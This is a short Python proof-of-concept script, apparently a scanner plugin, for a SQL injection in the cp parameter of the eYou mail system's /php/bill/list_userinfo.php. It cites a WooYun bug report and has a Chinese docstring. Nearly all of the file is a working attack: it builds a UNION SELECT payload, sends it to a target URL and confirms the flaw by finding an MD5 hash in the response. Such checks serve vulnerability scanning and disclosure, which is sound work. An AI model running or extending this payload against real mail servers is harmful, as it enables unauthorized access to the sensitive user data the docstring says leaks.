#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  eyou 邮件系统中 /php/bill/list_userinfo.php 中的 cp 参数存在注入, 将导致敏感数据泄漏
受影响版本v5.0.0 - v5.0.4 , v4 all 
From : http://www.wooyun.org/bugs/wooyun-2014-058014
"""


def assign(service,arg):
    if service == "eyou":
        return True, arg

def audit(arg):
    payload = "php/bill/list_userinfo.php?domain=fatezero.org&ok=1&cp=1%20union%20select%20md5(3.14),2,3,4,5%23"
    code, head, res, errcode,finalurl =  curl.curl("%s" % (arg + payload))
    if code == 200:
        if "63e1f04640e83605c1d177544a5a0488" in res:
            security_hole('find sql injection: ' + arg+payload)

if __name__ == "__main__":
    from dummy import *
    audit(assign('eyou', 'http://www.example.com/')[1])